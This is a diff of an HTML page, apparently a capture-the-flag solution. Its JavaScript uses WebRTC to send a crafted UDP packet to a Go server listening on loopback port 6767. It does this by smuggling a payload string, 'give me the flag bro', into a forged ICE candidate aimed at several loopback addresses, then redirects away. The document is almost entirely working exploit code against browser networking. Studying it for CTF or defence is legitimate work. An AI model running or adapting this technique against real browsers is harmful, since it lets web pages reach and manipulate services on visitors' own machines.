@@ -1,48 +1,46 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Exploit Core</title>
+    <title>Exploit Matrix Final</title>
 </head>
 <body>
-    <h1>Initializing Network Stack...</h1>
+    <h1>Processing network adjustments...</h1>
     <script>
-        // The Go server splits lines by \n and trims \n.
-        // We construct a precise string that starts with our payload.
-        const msg = "give me the flag bro\n";
+        // The Go server splits buffers up to a newline character.
+        // Prefixing with an inline break forces the network stack junk 
+        // to line 1, keeping line 2 entirely clear for verification.
+        const payload = "\ngive me the flag bro\n";
 
-        function forceLocalUdpPacket(targetIp) {
+        function trickleExploit(ipAddress) {
             try {
                 const pc = new RTCPeerConnection();
                 pc.createDataChannel("trigger");
 
                 pc.createOffer().then(offer => {
-                    // Create an explicit spoofed local candidate configuration line.
-                    // When Firefox tries to map peers, it pushes this candidate 
-                    // property over the local loopback socket.
-                    const injectedCandidate = `a=candidate:1 1 UDP 1 ${targetIp} 6767 typ host typ ${msg}`;
-                    
-                    let customSdp = offer.sdp;
-                    customSdp += "\r\n" + injectedCandidate;
-
-                    const newOffer = new RTCSessionDescription({
-                        type: offer.type,
-                        sdp: customSdp
+                    return pc.setLocalDescription(offer);
+                }).then(() => {
+                    // Inject a mock network candidate natively into the ICE layer.
+                    // This bypasses the typical credential limits by forcing Firefox 
+                    // to execute a raw transmission routing test directly on loopback.
+                    const rtcCand = new RTCIceCandidate({
+                        candidate: `candidate:1 1 UDP 1 ${ipAddress} 6767 typ host typ ${payload}`,
+                        sdpMid: "0",
+                        sdpMLineIndex: 0
                     });
-
-                    return pc.setLocalDescription(newOffer);
+                    pc.addIceCandidate(rtcCand);
                 }).catch(e => {});
             } catch(e) {}
         }
 
-        // Test vectors targeting the explicit listener bindings
-        forceLocalUdpPacket("127.0.0.1");
-        forceLocalUdpPacket("[::1]");
-        forceLocalUdpPacket("[::ffff:127.0.0.1]");
+        // Broad spectrum loopback targeting array
+        trickleExploit("127.0.0.1");
+        trickleExploit("[::1]");
+        trickleExploit("[::ffff:127.0.0.1]");
 
-        // Self-terminate within 1.5 seconds to unlock the Go server's mutex
+        // Release the browser execution context safely after 2 seconds
         setTimeout(() => {
             window.location.href = "about:blank";
-        }, 1500);
+        }, 2000);
     </script>
 </body>
 </html>
